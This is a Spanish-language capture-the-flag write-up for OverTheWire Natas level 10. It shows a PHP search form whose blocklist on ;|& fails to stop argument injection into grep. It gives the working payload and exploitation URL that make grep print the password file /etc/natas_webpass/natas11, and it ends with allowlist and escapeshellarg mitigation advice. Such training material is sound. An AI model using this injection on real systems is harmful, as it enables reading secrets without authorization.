# Natas 10 → 11: Command Injection con blocklist

[← Nivel 9](natas-09.md) · [Índice](../README.md) · [Nivel 11 →](natas-11.md)

| Campo | Detalle |
|-------|---------|
| **Wargame** | [OverTheWire: Natas](https://overthewire.org/wargames/natas/) |
| **Categoría** | Inyección |
| **Debilidad** | [CWE-88](https://cwe.mitre.org/data/definitions/88.html): Argument Injection |
| **Herramientas** | Navegador |
| **URL** | `http://natas10.natas.labs.overthewire.org` |
| **Credenciales** | `natas10` / `[redacted]` |

> [!NOTE]
> Las contraseñas y secretos están omitidos (`[redacted]`). El objetivo es documentar el método, no la respuesta.

## Resumen
El filtro bloquea los separadores de comandos, pero no impide inyectar un argumento extra a `grep` para que lea otro archivo.

## Análisis y explotación
1. La aplicación es igual a natas9, pero ahora filtra los caracteres `;`, `|` y `&` con una expresión regular:
   ```php
   if(preg_match('/[;|&]/',$key)) {
       print "Input contains an illegal character!";
   } else {
       passthru("grep -i $key dictionary.txt");
   }
   ```
2. El filtro bloquea los separadores de comandos más comunes, pero **no** los espacios, `/`, ni `.`.
3. Clave del exploit: `grep` acepta múltiples archivos como argumentos. Se puede inyectar una ruta adicional directamente en la invocación del comando sin usar separadores.
4. Payload en el campo de búsqueda:
   ```
   . /etc/natas_webpass/natas11
   ```
5. El servidor ejecuta:
   ```bash
   grep -i . /etc/natas_webpass/natas11 dictionary.txt
   ```
   El patrón `.` en regex coincide con cualquier carácter (todas las líneas), por lo que imprime el contenido completo de `/etc/natas_webpass/natas11` —la contraseña— junto con resultados del diccionario.

## Resultado

- **URL de explotación:**
  ```
  http://natas10.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search
  ```
- **Password obtenida (`natas11`):** `[redacted]`

## Lección aprendida y mitigación
Un filtro de denegación (*blocklist*) es inherentemente frágil: siempre puede quedar algún vector sin cubrir. La solución correcta es una **lista blanca** estricta que permita solo caracteres alfanuméricos (y los realmente necesarios), combinada con `escapeshellarg()`.

## Referencias
- [CWE-88](https://cwe.mitre.org/data/definitions/88.html): Argument Injection
- [OverTheWire: Natas](https://overthewire.org/wargames/natas/)

---
[← Nivel 9](natas-09.md) · [Índice](../README.md) · [Nivel 11 →](natas-11.md)
